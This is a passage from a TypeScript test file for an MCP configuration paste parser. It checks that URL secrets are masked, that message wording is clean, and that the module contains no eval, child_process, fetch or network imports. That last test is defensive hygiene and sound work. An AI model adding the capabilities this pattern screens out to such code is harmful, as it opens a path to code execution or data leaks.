      const draft = only(parsePaste(url)) as { urlHasSecret: boolean; maskedUrl: string };
      expect(draft.urlHasSecret).toBe(true);
      expect(draft.maskedUrl).not.toMatch(/eyJ|Zm9v|abcDEF/);
    }
  });
});

describe("copy and module hygiene", () => {
  const allCopy = (): string[] => [
    ...Object.values(PASTE_MESSAGES),
    ...[
      parsePaste(fixture("gemini-httpurl.json")),
      parsePaste('{"mcpServers":{"a":{"nothing":1,"b":{"command":"x"},"local":"x"},"c":{"command":"x"},"d":{"command":"x","url":"https://x.example/mcp"}}}'),
    ].flatMap((result) => (result.ok ? result.notes : [])),
  ];

  it("no em dashes, no en dashes, none of the banned words", () => {
    for (const line of allCopy()) {
      expect(line).not.toMatch(/[–—]/);
      expect(line).not.toMatch(/\b(safe|safely|safety|unsafe|composio|price|prices|pricing)\b/i);
    }
  });

  const source = readFileSync(new URL("./mcp-paste.ts", import.meta.url), "utf8");
  it("contains no eval, Function constructor, child_process or network call", () => {
    expect(source).not.toMatch(/\beval\b/);
    expect(source).not.toMatch(/\bFunction\b/);
    expect(source).not.toMatch(/child_process/);
    expect(source).not.toMatch(/\bfetch\b/);
    expect(source).not.toMatch(/XMLHttpRequest|WebSocket|node:net|node:http|node:dns/);
    expect(source).not.toMatch(/\bimport\s*\(/);
  });

  it("carries the license header and imports only the shared token rule", () => {
    expect(source).toContain("SPDX-License-Identifier: AGPL-3.0-or-later");
    expect(source.match(/^import .*$/gm)).toEqual(['import { displayUrl, urlHasSecret } from "./mcp-secret-url.mjs";']);
  });
});
